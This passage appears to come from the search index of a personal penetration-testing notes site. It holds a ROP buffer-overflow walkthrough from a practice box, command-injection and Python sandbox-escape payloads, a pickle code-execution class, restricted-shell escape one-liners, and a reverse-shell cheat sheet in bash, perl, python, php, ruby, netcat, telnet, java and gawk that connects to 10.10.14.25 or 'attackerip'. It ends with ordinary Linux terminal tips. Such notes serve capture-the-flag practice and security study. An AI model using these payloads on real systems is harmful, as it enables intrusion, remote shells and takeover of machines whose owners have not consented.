elf.process()\np = remote('hostname.address', port_number)\n\naddress_of_desired_func\njunk = 'A' * 22\npayload = junk + p32(address_of_desired_func)\n\np.interactive()\n</code></pre>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#miscellaneous-notes","title":"Miscellaneous notes:","text":"<ul> <li>https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/</li> <li>https://github.com/longld/peda</li> </ul>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#resources","title":"Resources:","text":"<ul> <li>pwntools<ul> <li>https://buildmedia.readthedocs.org/media/pdf/pwntools/stable/pwntools.pdf</li> <li>http://docs.pwntools.com/en/stable/rop/rop.html</li> <li>https://github.com/Gallopsled/pwntools-tutorial</li> </ul> </li> <li>https://www.cs.stevens.edu/~jschauma/631A/elf.html</li> <li>x64 Cheat Sheet</li> <li>https://reboare.github.io/bof/linux-stack-bof-3.html</li> <li>https://www.codetd.com/en/article/6763308</li> <li>https://ctf101.org/binary-exploitation/return-oriented-programming/</li> <li>https://medium.com/@iseethieves/intro-to-rop-rop-emporium-split-9b2ec6d4db08</li> <li>https://reboare.github.io/bof/linux-stack-bof-2.html</li> <li>https://stackoverflow.com/questions/44556590/how-can-i-exploit-a-buffer-overflow</li> <li>https://gist.github.com/superkojiman/6a6e44db390d6dfc329a</li> <li>https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/</li> <li>https://gist.github.com/apolloclark/6cffb33f179cc9162d0a</li> <li>https://www.exploit-db.com/docs/english/28475-linux-stack-based-buffer-overflows.pdf</li> <li>https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf</li> <li>https://dl.packetstormsecurity.net/papers/attack/64bit-overflow.pdf</li> <li>https://turkeyland.net/projects/overflow/shell.php</li> <li>https://resources.infosecinstitute.com/return-oriented-programming-rop-attacks/#gref</li> <li>https://nandynarwhals.org/ret2libc-namedpipes/</li> <li>https://penturalabs.wordpress.com/2011/03/31/vulnerability-development-buffer-overflows-how-to-bypass-full-aslr/</li> </ul>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#write-ups","title":"Write-ups","text":"<ul> <li>https://github.com/PlatyPew/picoctf-2018-writeup/tree/master/Binary%20Exploitation/rop%20chain</li> </ul>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#to-sort","title":"To Sort:","text":"<p>objdump -D myapp objdump -x myapp ropper --file myapp ropper --file myapp --search \"pop rdi\" readelf -s myapp</p> <p>ROPgadget --binary myapp --only \"mov|pop|ret\"</p> <p>readelf --sections myapp</p> <p>rabin2 -S myapp</p> <p>r2: pd @ sym.test iz /R pop iS /R pop rdi i</p> <p>db sym.main ood</p> <p>gdb:</p> <pre><code>gdb ./myapp\n\ngdb-peda$ set follow-fork-mode parent\ngdb-peda$ b main\ngdb-peda$ r\n\n\ngdb-peda$ x/x\n0x7fffffffe1c0: 0x0000000000401070\n\ngdb-peda$ rip\nUndefined command: \"rip\".  Try \"help\".\ngdb-peda$ $rip\nUndefined command: \"$rip\".  Try \"help\".\ngdb-peda$ $esp\nUndefined command: \"$esp\".  Try \"help\".\ngdb-peda$ p $rip\n$1 = (void (*)()) 0x401163 &lt;main+4&gt;\n\ngdb-peda$ disassemble\ngdb-peda$ vmmap binary\ngdb-peda$ vmmap all\ngdb-peda$ checksec\n\ngdb-peda$ find \"bin\"\ngdb-peda$ find \"/bin/\"\n\ngdb-peda$ info functions\n\ngdb-peda$ disassemble test\n\ngdb-peda$ set disassembly-flavor intel\ninfo registers\n</code></pre>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#my-initial-attempts-at-the-bof","title":"My initial attempts at the BoF","text":"<p>https://ctf101.org/binary-exploitation/return-oriented-programming/</p> <pre><code>gdb-peda$ checksec\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : disabled\nRELRO     : Partial\ngdb-peda$ set follow-fork-mode parent\n\ngdb-peda$ pattern create 200\n'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'\ngdb-peda$ r\nStarting program: /root/Documents/htb/boxes/safe/myapp\n[Detaching after fork from child process 30278]\n 02:03:30 up 1 day, 31 min,  1 user,  load average: 0.10, 0.17, 0.19\n\nWhat do you want me to echo back? AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\nProgram received signal SIGSEGV, Segmentation fault.\n\ngdb-peda$ x/xg $rsp\n0x7fffffffe158: 0x414f41413941416a\n\ngdb-peda$ pattern offset 0x414f41413941416a\n4706051884014715242 found at offset: 120\n</code></pre> <p>junk = \"A\" * 120</p> <pre><code>root@kali:~/Documents/htb/boxes/safe# ropper --file myapp --search \"pop rdi\"\n[INFO] Load gadgets for section: LOAD\n[LOAD] loading... 100%\n[LOAD] removing double gadgets... 100%\n[INFO] Searching for gadgets: pop rdi\n\n[INFO] File: myapp\n0x0000000000401090: pop rdi; adc dword ptr [rax], eax; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret;\n0x000000000040120b: pop rdi; ret;\n</code></pre> <p>pop_rdi = 0x40120b</p> <p>Address of main</p> <pre><code>root@kali:~/Documents/htb/boxes/safe# objdump -D myapp|grep main\n  401094:   ff 15 56 2f 00 00       callq  *0x2f56(%rip)        # 403ff0 &lt;__libc_start_main@GLIBC_2.2.5&gt;\n000000000040115f &lt;main&gt;:\n</code></pre> <p>main - 0x40115f</p> <pre><code>root@kali:~/Documents/htb/boxes/safe# objdump -D myapp|grep puts\n0000000000401030 &lt;puts@plt&gt;:\n  401030:   ff 25 e2 2f 00 00       jmpq   *0x2fe2(%rip)        # 404018 &lt;puts@GLIBC_2.2.5&gt;\n  4011a1:   e8 8a fe ff ff          callq  401030 &lt;puts@plt&gt;\n</code></pre> <p>plt (procedural link table) - 0x401030 got (global offset table) - 0x404018</p> <p>payload = junk + pop_rdi + got_put + plt_put + main</p> <pre><code>payload = \"A\"*120 + 0x40120b + 0x404018 + 0x401030 + 0x40115f\n</code></pre>"},{"location":"Exploits_and_Code_Execution/command_injection/","title":"Command Injection","text":"<p>```tab=\"Perl open(F, $file)\"</p>"},{"location":"Exploits_and_Code_Execution/command_injection/#if-the-filename-begins-with-the-filename-is-interpreted-as-a-command","title":"If the filename begins with \"|\", the filename is interpreted as a command","text":""},{"location":"Exploits_and_Code_Execution/command_injection/#to-which-output-is-to-be-piped-and-if-the-filename-ends-with-a-the","title":"to which output is to be piped, and if the filename ends with a \"|\", the","text":""},{"location":"Exploits_and_Code_Execution/command_injection/#filename-is-interpreted-as-a-command-which-pipes-output-to-us","title":"filename is interpreted as a command which pipes output to us.","text":""},{"location":"Exploits_and_Code_Execution/command_injection/#append-to-the-end-of-a-file-name-to-have-open-execute-the-file","title":"append | to the end of a file name to have open execute the file","text":"<p>/path/to/script|</p>"},{"location":"Exploits_and_Code_Execution/command_injection/#command-to-execute","title":"| command to execute","text":"<p>| cat /etc/passwd | whoami; id; pwd</p>"},{"location":"Exploits_and_Code_Execution/command_injection/#12","title":"1&gt;&amp;2| <p>cat /etc/passwd 1&gt;&amp;2| cat .passwd|xargs touch|    #tries to create a file named with the flag contents</p> <pre><code>```python tab=\"Python2 input()\"\n# input is equivalent to eval(raw_input(prompt))\nsys.stdout.write(open(\"/etc/passwd\").readline())\n\nexecfile(\"/PATH/TO/SCRIPT\")\n\nopen('/tmp/passwd', 'w').write(open('/etc/passwd').readline().strip())\n\neval(compile('import os; os.system(\"id\")', 'foobar.py', 'exec'))\neval(compile('import os; os.system(\"/bin/bash -p\")', 'f', 'exec'))\n\n    # redefine script functions:\n        eval(compile('def youLose():\\n print passwd','foobar.py','exec'))\n    # redefine builtin functions:\n        eval(compile('int = __builtins__.__dict__[\"print\"]','foobar.py','exec'))\n\n__import__('os').system('/bin/bash -p')\n__import__('os').execl('/bin/sh','sh')\n\n# set PYTHONINSPECT before executing the python script to enter interactive\n# mode after executing the script or the command\ndeclare -x PYTHONINSPECT=\u20191\u2019 ;\n</code></pre> <p>```python tab=\"python eval/exec (blacklisted input)\"</p>","text":""},{"location":"Exploits_and_Code_Execution/command_injection/#if-quotessingle-and-double-are-blacklisted","title":"if quotes(single and double) are blacklisted:","text":""},{"location":"Exploits_and_Code_Execution/command_injection/#use-combination-of-dir-getattr","title":"use combination of dir(), getattr()","text":""},{"location":"Exploits_and_Code_Execution/command_injection/#specifically-func_globals","title":"specifically func_globals <p>for x in dir(FUNCTION): print {x: getattr(FUNCTION, x)}</p>","text":""},{"location":"Exploits_and_Code_Execution/command_injection/#_1","title":"Command Injection","text":"<p>os = eval('im' + 'port(\"os\")') getattr(os, \"system\")</p>"},{"location":"Exploits_and_Code_Execution/command_injection/#if-builtins-are-deleted","title":"if builtins are deleted:","text":""},{"location":"Exploits_and_Code_Execution/command_injection/#httpszolmeistercom201305escaping-python-sandboxhtml","title":"https://zolmeister.com/2013/05/escaping-python-sandbox.html <p>().class.base.subclasses()[59].enter.func.globals['linecache'].checkcache.globals['os'].system</p>","text":""},{"location":"Exploits_and_Code_Execution/command_injection/#59","title":"59 =  <pre><code>```python tab=\"python pickle exploit\"\nimport os\nimport pickle\n\ndef pickle_me(cmd):\n    class Exploit(object):\n        def __reduce__(self):\n            # return (eval('os.system'), (cmd,))\n            return (os.system, (cmd,))\n    return pickle.dumps(Exploit())\n</code></pre>","text":""},{"location":"Exploits_and_Code_Execution/restricted_shell_escape/","title":"Escaping restricted shells","text":"<p>```bash tab=\"vim\" vim --cmd \"set shell=/bin/bash\" --cmd \"shell\"</p> <pre><code>```python tab=\"python\"\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\n\npython -c 'import os; os.system(\"/bin/bash\")'\n</code></pre> <p>```bash tab=\"tar\" tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash</p> <pre><code>```bash tab=\"zip\"\nzip $(mktemp -u) /etc/hosts -T --unzip-command=\"bash #\"\n\nzip $(mktemp -u) /etc/hosts -T -TT \"bash #\"\n\n### note: -TT is a shortened version of --unzip-command\n</code></pre> <p>```bash tab=\"awk\" awk 'BEGIN {system(\"/bin/bash\")}'</p> <pre><code>```bash tab=\"gdb\"\ngdb -q -nx -ex '!bash' -ex quit\n</code></pre> <p>```bash tab=\"pico\" pico -s \"/bin/bash\"</p>"},{"location":"Exploits_and_Code_Execution/restricted_shell_escape/#type-binbash-and-then-press-ctrl-t","title":"type /bin/bash and then press CTRL + T","text":"<p>TF=$(mktemp); echo 'exec bash'&gt;$TF; chmod 777 $TF; pico -s $TF /etc/hosts</p>"},{"location":"Exploits_and_Code_Execution/restricted_shell_escape/#immediately-ctrl-t","title":"immediately CTRL + T","text":"<pre><code>```bash tab=\"scp\"\nTF=$(mktemp); echo 'bash 0&lt;&amp;2 1&gt;&amp;2' &gt; $TF; chmod 777 \"$TF\"; scp -S $TF x y:\n\n### or if script.sh exists (bash 0&lt;&amp;2 1&gt;&amp;2)\nscp -S script.sh x y:\n</code></pre> <p>``` tab=\"man\" man man</p>"},{"location":"Exploits_and_Code_Execution/restricted_shell_escape/#then-type-binbash-and-then-press-enter","title":"then type !/bin/bash and then press enter","text":"<p>TF=$(mktemp); echo '/bin/bash &gt;&amp;2 0&gt;&amp;2'&gt;$TF; chmod 777 $TF; man --pager=/bin/bash $TF</p>"},{"location":"Exploits_and_Code_Execution/restricted_shell_escape/#echo-bash-02-12-scriptsh","title":"echo \"bash 0&lt;&amp;2 1&gt;&amp;2\" &gt; script.sh","text":"<p>man --pager=/bin/bash script.sh</p> <pre><code>```bash tab=\"ssh\"\nTF=$(mktemp); echo 'bash 0&lt;&amp;2 1&gt;&amp;2' &gt; $TF; chmod 777 $TF; ssh -o ProxyCommand=$TF 127.0.0.1\n\n### echo \"bash 0&lt;&amp;2 1&gt;&amp;2\" &gt; script.sh\nssh -o ProxyCommand=script.sh 127.0.0.1\n</code></pre> <p>```bash tab=\"git\" git help status</p>"},{"location":"Exploits_and_Code_Execution/restricted_shell_escape/#then-type-binbash-and-then-press-enter_1","title":"then type !/bin/bash and then press enter","text":"<p>TF=$(mktemp); echo 'bash 0&lt;&amp;2 1&gt;&amp;2' &gt; $TF; chmod 777 $TF; git -c core.pager=$TF --paginate help</p>"},{"location":"Exploits_and_Code_Execution/restricted_shell_escape/#echo-bash-02-12-scriptsh_1","title":"echo \"bash 0&lt;&amp;2 1&gt;&amp;2\" &gt; script.sh","text":"<p>git -c core.pager=script.sh --paginate help</p> <pre><code>```bash tab=\"rvim\"\nrvim\n## then type :python import os; os.system(\"/bin/bash\") and then press enter\n\nTF=$(mktemp); echo \"import os;os.system('bash')\" &gt; $TF; chmod 777 $TF; rvim -c \"pyfile $TF\"\n\n### echo \"import os;os.system('bash')\" &gt; script.py\nrvim -c \"pyfile script.py\"\n</code></pre> <p>```bash tab=\"script\" script -c /bin/bash /dev/null</p> <pre><code>```bash tab=\"mapfile (Read Files)\"\n### Useful if rbash is restricting cd and \"/\" in command names\nmapfile -t &lt; /PATH/TO/FILE; printf \"%s\\n\" \"${MAPFILE[@]}\"\nmapfile foo &lt; /PATH/TO/FILE; printf \"%s\" \"${foo[@]}\"\n\n## reference: https://www.computerhope.com/unix/bash/mapfile.htm\n</code></pre> <p>```bash tab=\"process substitution\"</p>"},{"location":"Exploits_and_Code_Execution/restricted_shell_escape/#read-files","title":"read files","text":"<p>echo $(&lt;../.passwd)</p> <pre><code>```bash tab=\"LD_PRELOAD\"\n## create a script that overwrites a C function\n## This example uses usleep (identified from objdump on the target binary)\n\n\n## script.c\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\nvoid usleep() {\nunsetenv(\"LD_PRELOAD\");\nsystem(\"echo ok! &amp;&amp; /bin/bash\");\nexit(0);\n}\n\nchmod 777 script.c\ngcc -shared script.c -o script\nchmod 777 script\n\ndeclare -x LD_PRELOAD=/PATH/TO/script\n</code></pre> <p>```bash tab=\"less\"</p>"},{"location":"Exploits_and_Code_Execution/restricted_shell_escape/#from-less-help","title":"from less --help:","text":"<p>!command             Execute the shell command with $SHELL. |Xcommand            Pipe file between current pos &amp; mark X to shell command.</p> <p>1) simply type in: !/bin/bash</p> <p>2) type ma |aCOMMAND</p>"},{"location":"Exploits_and_Code_Execution/restricted_shell_escape/#a-will-change-to-as-you-type","title":"|a will change to \"!\" as you type","text":"<p>```</p>"},{"location":"Exploits_and_Code_Execution/reverse_shells/","title":"Reverse Shell Cheat Sheet","text":""},{"location":"Exploits_and_Code_Execution/reverse_shells/#bash","title":"Bash","text":"<pre><code>bash -i &gt;&amp; /dev/tcp/10.10.14.25/8080 0&gt;&amp;1\n</code></pre> <pre><code>exec /bin/bash 0&amp;0 2&gt;&amp;0\n</code></pre> <pre><code>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196\n</code></pre>"},{"location":"Exploits_and_Code_Execution/reverse_shells/#perl","title":"PERL","text":"<pre><code>perl -e 'use Socket;$i=\"10.10.14.25\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'\n</code></pre> <p>Doesn't depend on /bin/sh</p> <pre><code>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"attackerip:4444\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'\n</code></pre> <p>for windows:</p> <pre><code>perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"attackerip:4444\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'\n</code></pre>"},{"location":"Exploits_and_Code_Execution/reverse_shells/#python","title":"Python","text":"<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.25\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n</code></pre> <p>TCP version (oneliner version of python-pty-shells/tcp_pty_backconnect.py) <code>NOTE: Replace /bin/bash with /bin/sh if needed</code></p> <pre><code>python -c 'import os; import pty; import socket; lhost=\"10.10.14.25\"; lport=9004; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close()'\n</code></pre> <p>Socat TCP Listener:</p> <pre><code>socat file:`tty`,echo=0,raw tcp4-listen:PORT\n</code></pre> <p>UDP version (oneliner version of python-pty-shells/udp_pty_backconnect.py) <code>NOTE: Replace /bin/bash with /bin/sh if needed</code></p> <pre><code>python -c 'import os; import pty; import socket; lhost = \"10.10.14.25\"; lport = 9004; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close()'\n</code></pre> <p>Socat UDP Listener:</p> <pre><code>socat file:`tty`,echo=0,raw udp-listen:PORT\n</code></pre>"},{"location":"Exploits_and_Code_Execution/reverse_shells/#php","title":"PHP","text":"<pre><code>php -r '$sock=fsockopen(\"10.10.14.25\",1234);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n</code></pre> <p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn\u2019t work, try 4, 5, 6\u2026</p>"},{"location":"Exploits_and_Code_Execution/reverse_shells/#ruby","title":"Ruby","text":"<pre><code>ruby -rsocket -e'f=TCPSocket.open(\"10.10.14.25\",1234).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'\n</code></pre> <p>doesn't require /bin/sh:</p> <pre><code>ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"attackerip\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n</code></pre> <p>for windows:</p> <pre><code>ruby -rsocket -e 'c=TCPSocket.new(\"attackerip\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n</code></pre>"},{"location":"Exploits_and_Code_Execution/reverse_shells/#netcat","title":"Netcat","text":"<p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don\u2019t support the -e option.</p> <pre><code>nc -e /bin/sh 10.10.14.25 1234\n</code></pre> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.25 1234 &gt;/tmp/f\n</code></pre>"},{"location":"Exploits_and_Code_Execution/reverse_shells/#telnet","title":"Telnet","text":"<pre><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip 4444 0/tmp/p\n</code></pre> <pre><code>telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Remember to listen on your machine also on port 4445/tcp\n</code></pre>"},{"location":"Exploits_and_Code_Execution/reverse_shells/#java","title":"Java","text":"<pre><code>r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.10.14.25/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])\np.waitFor()\n</code></pre>"},{"location":"Exploits_and_Code_Execution/reverse_shells/#xterm","title":"xterm","text":"<p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.10.14.25) on TCP port 6001.</p> <pre><code>xterm -display 10.10.14.25:1\n</code></pre> <p>To catch the incoming xterm, start an X-Server (:1 \u2013 which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p> <pre><code>Xnest :1\n</code></pre> <p>You\u2019ll need to authorise the target to connect to you (command also run on your host):</p> <pre><code>xhost +targetip\n</code></pre>"},{"location":"Exploits_and_Code_Execution/reverse_shells/#gawk","title":"gawk","text":"<pre><code>#!/usr/bin/gawk -f\n\nBEGIN {\n        Port    =       8080\n        Prompt  =       \"bkd&gt; \"\n\n        Service = \"/inet/tcp/\" Port \"/0/0\"\n        while (1) {\n                do {\n                        printf Prompt |&amp; Service\n                        Service |&amp; getline cmd\n                        if (cmd) {\n                                while ((cmd |&amp; getline) &gt; 0)\n                                        print $0 |&amp; Service\n                                close(cmd)\n                        }\n                } while (cmd != \"exit\")\n                close(Service)\n        }\n}\n</code></pre>"},{"location":"Linux/command_line_prompt/","title":"Command line prompt","text":""},{"location":"Linux/command_line_prompt/#colors-within-terminal-text","title":"colors within terminal / text","text":"<p>Version 1</p> <pre><code>red='\\e[31m'\nlred='\\e[91m'\ngreen='\\e[32m'\nlgreen='\\e[92m'\nyellow='\\e[33m'\nlyellow='\\e[93m'\nblue='\\e[34m'\nlblue='\\e[94m'\nmagenta='\\e[35m'\nlmagenta='\\e[95m'\ncyan='\\e[36m'\nlcyan='\\e[96m'\ngrey='\\e[90m'\nlgrey='\\e[37m'\nwhite='\\e[97m'\nblack='\\e[30m'\n\n# bg\nb_red='\\e[41m'\nb_lred='\\e[101m'\nb_green='\\e[42m'\nb_lgreen='\\e[102m'\nb_yellow='\\e[43m'\nb_lyellow='\\e[103m'\nb_blue='\\e[44m'\nb_lblue='\\e[104m'\nb_magenta='\\e[45m'\nb_lmagenta='\\e[105m'\nb_cyan='\\e[46m'\nb_lcyan='\\e[106m'\nb_grey='\\e[100m'\nb_lgrey='\\e[47m'\nb_white='\\e[107m'\nb_black='\\e[40m'\n\n# special\nreset='\\e[0;0m'\nbold='\\e[01m'\nitalic='\\e[03m'\nunderline='\\e[04m'\nblinking='\\e[05m'\ninverse='\\e[07m'\nconceil='\\e[08m'\ncrossedout='\\e[09m'\nbold_off='\\e[22m'\nitalic_off='\\e[23m'\nunderline_off='\\e[24m'\ninverse_off='\\e[27m'\nconceil_off='\\e[28m'\ncrossedout_off='\\e[29m'\n</code></pre> <p>Version 2</p> <pre><code># Reset\nColor_Off=\"\\e[0m\"       # Text Reset\n\n# Regular Colors\nBlack=\"\\e[0;30m\"        # Black\nRed=\"\\e[0;31m\"          # Red\nGreen=\"\\e[0;32m\"        # Green\nYellow=\"\\e[0;33m\"       # Yellow\nBlue=\"\\e[0;34m\"         # Blue\nPurple=\"\\e[0;35m\"       # Purple\nCyan=\"\\e[0;36m\"         # Cyan\nWhite=\"\\e[0;37m\"        # White\n\n# Bold\nBBlack=\"\\e[1;30m\"       # Black\nBRed=\"\\e[1;31m\"         # Red\nBGreen=\"\\e[1;32m\"       # Green\nBYellow=\"\\e[1;33m\"      # Yellow\nBBlue=\"\\e[1;34m\"        # Blue\nBPurple=\"\\e[1;35m\"      # Purple\nBCyan=\"\\e[1;36m\"        # Cyan\nBWhite=\"\\e[1;37m\"       # White\n\n# Underline\nUBlack=\"\\e[4;30m\"       # Black\nURed=\"\\e[4;31m\"         # Red\nUGreen=\"\\e[4;32m\"       # Green\nUYellow=\"\\e[4;33m\"      # Yellow\nUBlue=\"\\e[4;34m\"        # Blue\nUPurple=\"\\e[4;35m\"      # Purple\nUCyan=\"\\e[4;36m\"        # Cyan\nUWhite=\"\\e[4;37m\"       # White\n\n# Background\nOn_Black=\"\\e[40m\"       # Black\nOn_Red=\"\\e[41m\"         # Red\nOn_Green=\"\\e[42m\"       # Green\nOn_Yellow=\"\\e[43m\"      # Yellow\nOn_Blue=\"\\e[44m\"        # Blue\nOn_Purple=\"\\e[45m\"      # Purple\nOn_Cyan=\"\\e[46m\"        # Cyan\nOn_White=\"\\e[47m\"       # White\n\n# High Intensty\nIBlack=\"\\e[0;90m\"       # Black\nIRed=\"\\e[0;91m\"         # Red\nIGreen=\"\\e[0;92m\"       # Green\nIYellow=\"\\e[0;93m\"      # Yellow\nIBlue=\"\\e[0;94m\"        # Blue\nIPurple=\"\\e[0;95m\"      # Purple\nICyan=\"\\e[0;96m\"        # Cyan\nIWhite=\"\\e[0;97m\"       # White\n\n# Bold High Intensty\nBIBlack=\"\\e[1;90m\"      # Black\nBIRed=\"\\e[1;91m\"        # Red\nBIGreen=\"\\e[1;92m\"      # Green\nBIYellow=\"\\e[1;93m\"     # Yellow\nBIBlue=\"\\e[1;94m\"       # Blue\nBIPurple=\"\\e[1;95m\"     # Purple\nBICyan=\"\\e[1;96m\"       # Cyan\nBIWhite=\"\\e[1;97m\"      # White\n\n# High Intensty backgrounds\nOn_IBlack=\"\\e[0;100m\"   # Black\nOn_IRed=\"\\e[0;101m\"     # Red\nOn_IGreen=\"\\e[0;102m\"   # Green\nOn_IYellow=\"\\e[0;103m\"  # Yellow\nOn_IBlue=\"\\e[0;104m\"    # Blue\nOn_IPurple=\"\\e[10;95m\"  # Purple\nOn_ICyan=\"\\e[0;106m\"    # Cyan\nOn_IWhite=\"\\e[0;107m\"   # White\n\n# Various variables you might want for your PS1 prompt instead\nTime12h=\"\\T\"\nTime12a=\"\\@\"\nPathShort=\"\\w\"\nPathFull=\"\\W\"\nNewLine=\"\\n\"\nJobs=\"\\j\"\n</code></pre>"},{"location":"Linux/useful_linux_commands/","title":"Useful Linux Commands","text":"<p>command line formatting (for reverse shells):</p> <pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'\n# background process\nstty raw -echo\n# bring process back into foreground\nfg\n\nexport TERM=xterm-256color\nstty rows 45 cols 205\nexport PS1=\"\\[\\e[01;33m\\]\\u@\\h\\[\\e[00m\\]:\\[\\e[01;35m\\]\\w\\[\\e[00m\\]\\$ \"\n\n# with window title\nexport PS1=\"\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\e[01;33m\\]\\u@\\h\\[\\e[00m\\]:\\[\\e[01;35m\\]\\w\\[\\e[00m\\]\\$ \"\n</code></pre> <p>Get command to set LS colors:</p> <pre><code>/usr/bin/dircolors -b\n</code></pre>"},{"location":"Linux/useful_linux_commands/#print-man-pages-to-the-terminal","title":"Print man pages to the terminal","text":"<pre><code>man -P cat ssh\n</code></pre>"},{"location":"Linux/useful_linux_commands/#hexdump","title":"Hexdump","text":"<pre><code># only the hex portion\nhexdump -ve '/1 \"%02x \"' encrypted.bin | awk '{$1=$1};1'\n\n# only hex, with frequency of each byte\nhexdump -ve '/1 \"%02x \" \"\\n\"' encrypted.bin | sort | uniq -c | sort -nr\n</code></pre>"},{"location":"Linux/useful_linux_commands/#remove-null-bytes-from-file","title":"Remove Null Bytes from file:","text":"<pre><code>tr &lt; file-with-nulls -d '\\000' &gt; file-without-nulls\n</code></pre>"},{"location":"Linux/useful_linux_commands/#sort-files-in-directory-by-line-count","title":"Sort files in directory by line count","text":"<pre><code>find /path/to/directory -type f -exec wc -l {} + | sort -rn\n</code></pre>"},{"location":"Linux/useful_linux_commands/#loop-through-lines-of-a-file","title":"Loop through lines of a file","text":"<pre><code>while read p; do\necho $p\ndone &lt;peptides.txt\n</code></pre>"},{"location":"Linux/useful_linux_commands/#recursively-delete-empty-directories","title":"recursively delete empty directories","text":"<pre><code># the GNU version of find supports the -empty test\n# print all empty directories below your current directory\nfind . -type d -empty -print\n\n# deletes the empty directories\nfind . -type d -empty -delete\n</code></pre>"},{"location":"Linux/useful_linux_commands/#displaying-permissions-of-file-as-octal","title":"Displaying permissions of file (as octal)","text":"<p>https://askubuntu.com/questions/152001</p> <pre><code>stat -c \"%a %n\" *\n</code></pre>"},{"location":"Linux/useful_linux_commands/#compression-de-compression","title":"Compression / De-Compression","text":"commands file extensions example zip, unzip gzip, gunzip, gzcat, zcat .gz bzip2, bunzip2, bzcat .bz2, .bz, .tbz2 or .tbz tar .tar <code>tar -xzvf myfile.tar.gz</code>"},{"location":"Linux/useful_linux_commands/#user-group-management","title":"User &amp; Group management","text":"<pre><code>adduser username grouptoadd #add user to group\ngpasswd -d user group       #remove user from group\nuseradd     #create user\nuserdel     #delete user\ngroupadd    #create group\ngroupdel    #delete Group\n</code></pre>"},{"location":"Linux/useful_linux_commands/#file-stats-stat-command","title":"file stats (stat Command)","text":"<pre><code>stat &lt;filename&gt;\n</code></pre>"},{"location":"Linux/useful_linux_commands/#check-if-linux-is-32-or-64-bit","title":"Check if Linux is 32 or 64 bit:","text":"<p><code>arch   # x86_64 = 64 bit and i686, i386, etc. = 32 bit (best way to determine the architecture is to run the arch command and google the output)</code></p>"},{"location":"Linux/useful_linux_commands/#backgrounded-jobs","title":"backgrounded jobs","text":"<pre><code># 